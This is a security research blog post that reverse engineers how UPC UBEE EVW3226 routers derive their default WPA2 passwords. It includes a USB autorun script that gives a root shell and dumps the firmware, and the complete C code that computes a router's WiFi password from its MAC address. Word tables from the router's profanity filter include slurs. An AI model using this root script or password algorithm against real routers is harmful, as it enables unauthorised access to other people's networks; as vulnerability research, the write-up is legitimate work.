---
layout: post
title:  "UPC UBEE EBW3226 WPA2 Password RExing"
date:   2016-06-14 19:11:48 +0200
categories: blog
tags: hacking router reversing hacking

---

# Introduction

This work was motivated by the work of [Blasty](https://twitter.com/bl4sty).
Several months ago he published the algorithm ( [upc_keys.c](https://haxx.in/upc-wifi/) ) generating candidate default
WPA2 passwords for UPC WiFi routers using just SSID of the router. Vulnerable routers used just router ID to generate
default WiFi password and WiFi SSID. Algorithm goes through all possible router serial IDs and if SSID matches,
it prints out candidate WiFi password (cca 20).

To our surprise it worked pretty well in our city, where 6 out of 10 UPC WiFi around were vulnerable. But it didn’t
work for newer router models and for my own. So we decide to look at this particular model if we were lucky to find
the same vulnerability in it.

Our modem is UBEE EVW3226. As I don’t want to experiment on my own home router I bought one from the guy selling
exactly the same model. There are guys who managed to get root access to the router by connecting to the UART
interface of the router. I recommend going through this article: <https://www.freeture.ch/?p=766>

Lucky for us, we didn’t have to mess with the UART interface of the router even though I was looking forward to it.
Just a day before I bought my UBEE router for experiments, Firefart [published an article](https://firefart.at/post/upc_ubee_fail/)
how to get a root on the router just by inserting a USB drive with simple scripts.

Tl;dr: If USB drive has name `EVW3226`, shell script
`.auto` on it gets executed with system privileges. With this script you start SSH server, you connect
to the router and have the root.

# Firmware Extraction

With this I managed to dump the whole firmware on the mounted USB drive.
The script we use to start SSH daemon and to dump the firmware is below:

```bash
#!/bin/bash
if [ ! -e /etc/passwd.1 ]; then
	cp /etc/passwd /etc/passwd.1

    # This works!
    #echo "admin:FvTuBQSax2MqI:0:0:admin,,,:/:/bin/sh" > /etc/passwd
    dropbear -r /var/tmp/disk/dropbear_rsa_host_key -p 192.168.0.1:22

    # Dump router to the drive
    WHERE=/var/tmp/disk/HOMEROUTER
    mkdir -p ${WHERE}
    tar -cvpf ${WHERE}/router-image-root.tar -X/var/tmp/disk/tar-exclude /
    sync

    for i in 0 1 2 3 4 5 6 7 8 9 10; do echo "CurDisk: mtdblock$i"; dd if="/dev/mtdblock${i}"\
           of="${WHERE}/fw-${i}.bin" bs=1 conv=noerror; done
   for i in 0 1 2 3 4 5 6 7 8 9 10; do echo "CurDisk: mtd$i"; dd if="/dev/mtd${i}" \
           of="${WHERE}/fw-${i}b.bin" bs=1 conv=noerror; done
   sync

    DDIR=`pwd`
    WHERE=/var/tmp/media/0AAA-0E65/HOMEROUTER
    cd /
	mkdir -p $WHERE
	find /proc -type f | grep -v '/sys/' | grep -v '/net/' | grep -v '/kmsg' | \
       while read F ; do
   		D=${WHERE}/${F%/*}
   		echo "D: $D  F: $F WHERE: ${WHERE}$F"
   		test -d "$D" || mkdir -p $D && echo "DIR: $D"
   		test -f "${WHERE}$F" || cat $F > ${WHERE}$F
	done
	cd "$DDIR"
fi
```

This is actually very powerful and convenient attack vector. One comes with USB drive to the router,
plugs it in and has a WPA2 password in seconds (all system configuration).

I’ve created a TAR of the whole filesystem plus raw binary images of the mounted file system.
With SSH I could start mess around the router firmware.

Firstly, the quick review of mounted file systems:

```
# mount
rootfs on / type rootfs (rw)
/dev/root on / type squashfs (ro,relatime)
proc on /proc type proc (rw,relatime)
ramfs on /var type ramfs (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
tmpfs on /dev type tmpfs (rw,relatime)
devpts on /dev/pts type devpts (rw,relatime,mode=600)
/dev/mtdblock10 on /nvram type jffs2 (rw,relatime)
tmpfs on /fss type tmpfs (rw,relatime)
/dev/mtdblock6 on /fss/gw type squashfs (ro,relatime)
/dev/mtdblock7 on /fss/fss2 type squashfs (ro,relatime)
/dev/mtdblock9 on /fss/fss3 type squashfs (ro,relatime)
tmpfs on /etc type tmpfs (rw,relatime)
/dev/sda1 on /var/tmp/media/0AAA-0E65 type vfat (rw,relatime,fmask=0022,dmask=0022,codepage=cp437,iocharset=utf8,shortname=mixed,errors=remount-ro)

# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00020000 00010000 "U-Boot"
mtd1: 00010000 00010000 "env1"
mtd2: 00010000 00010000 "env2"
mtd3: 00b80000 00010000 "UBFI1"
mtd4: 001c191c 00010000 "Kernel"
mtd5: 00504c00 00010000 "RootFileSystem"
mtd6: 00377000 00010000 "FS1"
mtd7: 00440000 00010000 "FS2"
mtd8: 00b80000 00010000 "UBFI2"
mtd9: 00400000 00010000 "FS3"
mtd10: 00080000 00010000 "nvram"
```

Calling the cli command revealed firmware version

```
# cli
IMAGE_NAME=vgwsdk-3.5.0.24-150324.img
FSSTAMP=20150324141918
VERSION=EVW3226_1.0.20
```

While USB was dumping the firmware I went for the target - WiFi password. In the process list `ps -a` I’ve found:

```
5681 admin     1924 S    hostapd -B /tmp/secath0
```

`hostapd` is clearly the daemon running WiFi. It has the password to the WiFi stored in its configuration.
And clearly, there must be a binary/script that generates that configuration when user changes the
password OR the router is factory reset.

The file `secath0` stores the configuration. All the files are attached in the archive to this
article. I select only relevant lines. The configuration file stated:

```
interface=ath0
bridge=rndbr1
logger_stdout=-1
logger_stdout_level=2
dump_file=/tmp/hostapd.dump
ctrl_interface=/var/run/hostapd
ssid=UPC2495638

wpa=3
wpa_passphrase=WWMMVTZS
wpa_key_mgmt=WPA-PSK
```

Great, we have *SSID* and *PASSPHRASE* stored here. Something must have generated this configuration file.

# Firmware analysis

For more experiments, we use `router-image-root.tar`, extract it on local file system to look around. With this
 we find interesting binaries that have something to do with `secath0` file.
Note this is naive approach, the thing you try first. Binaries might have been obfuscated so the strings
won’t reveal anything. In this case, we were lucky.

```
find . -type f -exec grep -il 'secath0' {} \;
./fss/gw/lib/libUtility.so
./fss/gw/usr/sbin/aimDaemon
./fss/gw/usr/www/cgi-bin/setup.cgi
./var/tmp/conf_filename
./var/tmp/www/cgi-bin/setup.cgi
```

There are obviously 3 nice looking candidates to inspect further. `libUtility.so`, `aimDaemon`, `setup.cgi`.
You can also find those attached to the article. Running strings at those files reveals a lot of interesting stuff.
Even bizarre - more on that later.

`Setup.cgi` - it is the main script that handles changes in the router admin user interface (www, cgi).
Lets look at it with IDA Pro. The function list got my attention:

[![Function table](/static/ubee/functionTable.png)](/static/ubee/functionTable.png)

Symbols were not removed, which makes analysis substantially easier (child play even).
`GWDB_UBEE_DEFAULT_SSID_SET` looks promising. Function graph calling this looks like this:

[![Call graph](/static/ubee/callGraph01.png)](/static/ubee/callGraph01.png)

So `sub_17CF0` could be some kind of factory reset / apply settings routine. Which indeed is, as function
inspection shown. I recommend going through the whole routine to get impression how that works in detail.
Basically, it sets MAC addresses, generate SSIDs, passwords, sets up the firewall and parental control,
some settings are stored to `/nvram/*`.

[![sub_17CF0 intro](/static/ubee/sub17CF0Intro.png)](/static/ubee/sub17CF0Intro.png)

These chunks are particularly interesting to me:

![Default Passphrase set](/static/ubee/defaultPassphraseSet.png)  |  ![Default SSID set](/static/ubee/defaultSSIDSet.png)

BTW just a side note, programmer of this router is probably kind of guy which presses CTRL+C multiple times when
copying something, just to be sure it really did copy to clipboard:

[![Sync Sync Sync](/static/ubee/syncSyncSync.png)](/static/ubee/syncSyncSync.png)

So `GenUPCDefaultPassPhrase` is our target. This one is not directly in the `setup.cgi` file but it is an
imported function. Simple search gives where else this symbol is mentioned:

```
find . -type f -exec grep -il 'GenUPCDefaultPassPhrase' {} \;
./fss/gw/lib/libUtility.so
```

The file `libUtility.so` also has symbols in it. Finding the generation function and reversing it was quite simple.
I had quite funny moments when reversing the function so I recommend to go through it.
I minimize the level of boring details. Attached assembly snippets are just for illustrative purposes, no need to study it in depth...

The intro looked like this:

[![Intro](/static/ubee/genIntro.png)](/static/ubee/genIntro.png)

The function does some initialization in the beginning, local variable setting and so on.
Few instructions later, it reads a file `/nvram/1/1`.

[![NVRAM read](/static/ubee/nvramRead.png)](/static/ubee/nvramRead.png)

Depending on the mode input parameter (2.4 or 5GHz WiFi flag), it reads _6_ bytes,
either from offset _0x20_ or _0x32_ from the file. 6 bytes suggests it is _MAC_ address of the device.
You don’t have to be genius to guess that, look at the function `j_increaseMACAddress` - which increments MAC
address by 1. Luckily, this is the only input the function takes to generate WPA2 passwords! It means one can
generate the exact password, without need to guess the candidate ones (as Blasty found for another model).

[![Increase MAC](/static/ubee/modIncreaseMac.png)](/static/ubee/modIncreaseMac.png)

The MAC address is then plug to the weird looking magic string. It does:

```c
sprintf(buff1, "%2X%2X%2X%2X%2X%2X555043444541554C5450415353504852415345",
  mac[0], mac[1],
  mac[2], mac[3],
  mac[4], mac[5]);
```

It seems like there is a MAC used to derive multiple different outputs (SSID, PASSPHRASE) in the code, so
the differentiate it for different uses, a different suffix is added to it. In fact, converted to ASCII
it says `UPCDEAULTPASSPHRASE`.

[![sprintf Magic string](/static/ubee/sprintfMagicString.png)](/static/ubee/sprintfMagicString.png)

This resulting string got MD5 hashed:

[![hashing 01](/static/ubee/hashing01.png)](/static/ubee/hashing01.png)

Just in case the hashed string had too much entropy, guys decided to do another `sprintf`,
but cutting it down using 3 bytes of entropy at maximum (buff2 contains the MD5 hash):

```c
sprintf(buff3, "%.02X%.02X%.02X%.02X%.02X%.02X",
  buff2[0]&0xF, buff2[1]&0xF,
  buff2[2]&0xF, buff2[3]&0xF,
  buff2[4]&0xF, buff2[5]&0xF);
```

[![sprintf01](/static/ubee/sprintf01.png)](/static/ubee/sprintf01.png)

As a good crypto guy you know what to do next, hash it again, so it is really secure:

[![hashing 02](/static/ubee/hashingAgain.png)](/static/ubee/hashingAgain.png)

Later things got interesting as well, the following function is doing modulo 0x1a = 26. What is the length of english
alphabet. Somebody is trying to beat `[A-Z]{8}` string out of it - which is good for us as UPC password is exactly of
this format.

So far the WPA2 default password derivation function is basically like this:

```c

// 1. MAC + hex(UPCDEAULTPASSPHRASE)
sprintf(buff1, "%2X%2X%2X%2X%2X%2X555043444541554C5450415353504852415345",
  mac[0], mac[1],
  mac[2], mac[3],
  mac[4], mac[5]);

// 2.
MD5_Init(&ctx);
MD5_Update(&ctx, buff1, strlen((char*)buff1)+1);
MD5_Final(buff2, &ctx);

// 3.
sprintf(buff3, "%.02X%.02X%.02X%.02X%.02X%.02X",
  buff2[0]&0xF, buff2[1]&0xF,
  buff2[2]&0xF, buff2[3]&0xF,
  buff2[4]&0xF, buff2[5]&0xF);

// 4.
MD5_Init(&ctx);
MD5_Update(&ctx, buff3, strlen((char*)buff3)+1);
MD5_Final(hash_buff, &ctx);

sprintf(passwd, "%c%c%c%c%c%c%c%c",
        0x41u + ((hash_buff[0]+hash_buff[8]) % 0x1Au),
        0x41u + ((hash_buff[1]+hash_buff[9]) % 0x1Au),
        0x41u + ((hash_buff[2]+hash_buff[10]) % 0x1Au),
        0x41u + ((hash_buff[3]+hash_buff[11]) % 0x1Au),
        0x41u + ((hash_buff[4]+hash_buff[12]) % 0x1Au),
        0x41u + ((hash_buff[5]+hash_buff[13]) % 0x1Au),
        0x41u + ((hash_buff[6]+hash_buff[14]) % 0x1Au),
        0x41u + ((hash_buff[7]+hash_buff[15]) % 0x1Au));
```

## Statistical analysis

What is interesting is a way the projection to 26 character alphabet ( last `sprintf` ).
Programmer does byte addition here, modulo 26. On the first reading this might seem weird, why he just not did

```c
0x41u + (hash_buff[0] % 0x1Au)
```

or

```c
0x41u + ((hash_buff[0]^hash_buff[8]) % 0x1Au)
```

Actually now the choice of addition is very clever because the output distribution on the alphabet is almost uniform.
Compared to naive approaches I mentioned, which seemingly gives non-uniform distribution for 22, 23, 34, 25 as 255 mod 26 = 21.

[![A plus B mod 26](/static/ubee/distribApBmod26.png)](/static/ubee/distribApBmod26.png)

[![A xor B mod 26](/static/ubee/distribAxBmod26.png)](/static/ubee/distribAxBmod26.png)


## Reversing part 2

So I went through the analysis and the next thing completely blew my mind:

[![Profanity check](/static/ubee/profanities02.png)](/static/ubee/profanities02.png)

You cannot miss the “cocks” right in front of you. So there is a profanities_ptr which points to the database of
rude words…

# Profanity analysis

From curiosity I went through the database. Here is the small sample:

[![Profanity hex sample](/static/ubee/profanityHexSample.png)](/static/ubee/profanityHexSample.png)

So the UPC default password generation does apply some obscure hashing function, generates
`[A-Z]{8}` string from it and then checks if by any chance some of the rude words is not a substring of the
generated password. Of course, this is a production problem, who wants to deal with an angry customer
calling your help desk complaining the default password on his router is *MILFPIMP* or *ANALBLOW*, right?

In case the generated password contains this profanity in it, UBEE engineers added a special, non-insulting alphabet
for help. The alphabet is visible on the beginning of the analyzed function: `BBCDFFGHJJKLMNPQRSTVVWXYZZ`, the classic
one with almost vowels removed. I did a quick search and truly, there cannot be made a rude word from UBEE
profanity database with this alphabet.

The weird thing about profanity database was there were some of them multiple times, with varying case.
I was wondering why somebody didn’t converted it all to uppercase and removed duplicates at the first place.
Instead of that, UBEE router converts it to uppercase and goes through them incrementally when generating a
random password. Useless CPU cycles... (how many CO emissions could have saved generating it wisely?).
Another thing, the database contains a word “PROSTITUTE” which is made of 10 characters, but there is no
chance the password would match this.

Another optimization would be to remove profanities that are substrings of other profanities.
E.g., "COCK", "COCKS", "COCKY", "ACOCK"

Basically this is the generation routine. You can find all codes we used, profanity database and more in the archive for the article.

So to have a bit more fun, we generated a SQL database for all MAC addresses starting on `0x647c34` =
UBEE vendor prefix, what is 2^24 = 16777216 passwords. This is quite a number so the profanity detection
was optimized by building [Aho-Corasick](https://en.wikipedia.org/wiki/Aho%E2%80%93Corasick_algorithm)
search automaton, initialized with all profanities found
(very rude automaton indeed). If the profanity was detected as a substring, we also generated a new password from non-insulting alphabet.

From 16777216 passwords in total, 32105 contained at least one togprofanity in it, in particular in 0.19% cases.
From 32105 cases there were:
3 character profanities: 23090
4 character profanities: 6014
5 character profanities: 3001

3 character profanities were just 4, with counts:

<!--
```sql
select profanity, count(profanity) as cx from wifi where profanity is not null and length(profanity)=3 group by profanity order by cx desc;
```
-->

[![Profanity size 3](/static/ubee/profanities_c3.png)](/static/ubee/profanities_c3.png)

4 character distribution (33 distinct):

| Word | Occurences | Word | Occurences | Word | Occurences |
| ---- |:----------:| ---- |:----------:| ---- |:----------:|
BUTT   |233         | HOLE |191         | MILF |172
BLOW   |209         | HATE |190         | CUNT |166
AIDS   |205         | DUMB |189         | SMUT |166
DIRT   |205         | SHIT |189         | PORN |165
SEAM   |203         | FUCK |183         | SUCK |165
SLUT   |201         | LICK |181         | DOPE |162
JAIL   |196         | DICK |178         | ANAL |161
COON   |195         | ABBO |177         | PISS |160
GIMP   |194         | BALL |177         | HEAD |155
BOYS   |192         | CRAP |177         | COCK |154
TITS   |192         | TURD |177         | PIMP |154

[![Profanity size 4](/static/ubee/profanities_c4.png)](/static/ubee/profanities_c4.png)

5 character (including only most popular ones) total 517 distinct:

| Word | Occurences |
| ---- |:----------:|
HAETS|19
TUBAS|19
BABES|17
MICHE|17
WOADS|17
FECES|16
NATAL|16
SKIRT|16
WINEY|16
ERECT|15

[![Profanity size 5](/static/ubee/profanities_c5.png)](/static/ubee/profanities_c5.png)